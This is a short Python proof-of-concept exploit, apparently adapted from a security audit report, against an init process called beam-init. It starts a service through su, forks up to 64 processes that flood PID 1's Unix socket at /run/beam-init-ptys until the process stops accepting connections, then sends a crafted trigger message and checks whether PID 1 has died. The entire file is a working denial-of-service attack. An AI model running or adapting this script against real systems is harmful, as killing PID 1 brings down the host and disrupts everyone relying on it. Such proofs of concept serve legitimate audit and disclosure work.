#!/usr/bin/env python3
# Adapted from Doyensec audit report

import os, resource, socket, subprocess, sys, time

P = "/run/beam-init-ptys"
SERVICE = sys.argv[1] if len(sys.argv) > 1 else "mine"

# Use su --pty to set a controlling tty for beamctl
subprocess.Popen(["su", "--pty", "root", "-c", f"beamctl start --name {SERVICE} --pty -- sleep infinity"])
time.sleep(1)

resource.setrlimit(resource.RLIMIT_NOFILE, (resource.getrlimit(resource.RLIMIT_NOFILE)[1],) * 2)

trigger = socket.socket(socket.AF_UNIX)
trigger.connect(P) # reserved before exhaustion

def fill(w):
    held, stall = [], 0
    while True:
        try:
            s = socket.socket(socket.AF_UNIX)
            s.setblocking(False)
            s.connect(P)
        except BlockingIOError: # beam-init stopped accepting
            s.close()
            stall += 1
            if stall > 10:
                os.write(w, b"F")
                break
            time.sleep(0.1)
            continue
        except OSError: # this process hit its own nofile limit
            os.write(w, b"L")
            break
        stall = 0
        held.append(s)
    time.sleep(1e6)

t0 = time.time()
for n in range(1, 65):
    r, w = os.pipe()
    if os.fork() == 0:
        trigger.close()
        os.close(r)
        fill(w)
        os._exit(0)
    res = os.read(r, 1)
    os.close(r)
    os.close(w)
    print(f" filler {n}: {'PID 1 stopped accepting' if res == b'F' else 'own limit'}"
          f" ({time.time() - t0:.0f}s)", flush=True)
    if res == b"F":
        break
else:
    print("beam-init still accepting after 64 fillers")
    sys.exit(1)

trigger.sendall(bytes([len(SERVICE)]) + SERVICE.encode())
time.sleep(1)

alive = os.path.exists("/proc/1") and open("/proc/1/comm").read().strip() or "gone"
print(f"PID 1: {alive}")
sys.exit(1 if alive == "gone" else 0)
